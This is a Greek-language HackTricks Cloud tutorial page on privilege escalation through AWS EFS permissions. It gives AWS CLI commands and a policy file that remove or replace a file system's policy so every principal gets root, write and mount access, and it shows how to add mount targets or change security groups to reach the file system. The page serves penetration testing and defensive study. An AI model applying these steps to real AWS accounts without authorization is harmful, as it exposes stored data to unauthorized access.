# AWS - EFS Εscalation Δικαιωμάτων

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκερ κάνοντας υποβολή PRs** στα αποθετήρια [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## EFS

Περισσότερες **πληροφορίες σχετικά με το EFS** σε:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

Θυμηθείτε ότι για να προσαρτήσετε ένα EFS πρέπει να βρίσκεστε σε ένα υποδίκτυο όπου το EFS είναι προσβάσιμο και να έχετε πρόσβαση σε αυτό (ομάδες ασφαλείας). Αν συμβαίνει αυτό, από προεπιλογή θα μπορείτε πάντα να το προσαρτήσετε, ωστόσο, αν προστατεύεται με πολιτικές IAM, πρέπει να έχετε τα επιπλέον δικαιώματα που αναφέρονται εδώ για να έχετε πρόσβαση σε αυτό.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

Με οποιοδήποτε από αυτά τα δικαιώματα ένας επιτιθέμενος μπορεί να **αλλάξει την πολιτική του συστήματος αρχείων** για να **σας δώσει πρόσβαση** σε αυτό, ή απλά να το **διαγράψει** έτσι ώστε να χορηγείται η **προεπιλεγμένη πρόσβαση**.

Για να διαγράψετε την πολιτική:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
Για να το αλλάξετε:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

Με αυτήν την άδεια, ένας επιτιθέμενος θα μπορεί να **τοποθετήσει σε λειτουργία το EFS**. Αν η άδεια εγγραφής δεν δίνεται από προεπιλογή σε όλους όσους μπορούν να τοποθετήσουν σε λειτουργία το EFS, τότε θα έχει μόνο **πρόσβαση ανάγνωσης**.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
Οι επιπλέον άδειες `elasticfilesystem:ClientRootAccess` και `elasticfilesystem:ClientWrite` μπορούν να χρησιμοποιηθούν για **εγγραφή** μέσα στο σύστημα αρχείων μετά την προσάρτησή του και για **πρόσβαση** σε αυτό το σύστημα αρχείων **ως ριζοχρήστης**.

**Πιθανή Επίπτωση:** Έμμεση αύξηση προνομίων εντοπίζοντας ευαίσθητες πληροφορίες στο σύστημα αρχείων.

### `elasticfilesystem:CreateMountTarget`

Αν ένας επιτιθέμενος βρίσκεται μέσα σε ένα **υποδίκτυο** όπου δεν υπάρχει **σημείο προσάρτησης** του EFS, μπορεί απλά να **δημιουργήσει ένα στο δικό του υποδίκτυο** με αυτό το προνόμιο:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**Πιθανή Επίδραση:** Έμμεση ανύψωση προνομίων με τον εντοπισμό ευαίσθητων πληροφοριών στο σύστημα αρχείων.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

Σε ένα σενάριο όπου ένας επιτιθέμενος ανακαλύπτει ότι το EFS έχει σημείο προσάρτησης στο δίκτυό του αλλά **κανένα security group δεν επιτρέπει την κίνηση**, απλά μπορεί **να αλλάξει αυτό τροποποιώντας τα επιλεγμένα security groups**:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**Πιθανή Επίδραση:** Έμμεση ανύψωση προνομίων με τον εντοπισμό ευαίσθητων πληροφοριών στο σύστημα αρχείων.

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο Hacking του AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**Εκπαίδευση HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο Hacking του GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**Εκπαίδευση HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Συμμετέχετε** 💬 στην [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Κοινοποιήστε κόλπα χάκινγκ υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
{% endhint %}
